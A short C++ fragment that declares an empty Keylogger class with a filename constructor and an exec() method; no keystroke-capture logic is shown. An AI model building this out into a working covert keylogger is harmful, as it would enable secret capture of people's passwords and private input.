#include "keylogger.h"

using namespace std;

class Keylogger
{
public:
	Keylogger(string filename);
	void exec();
private:
	string f_name;
};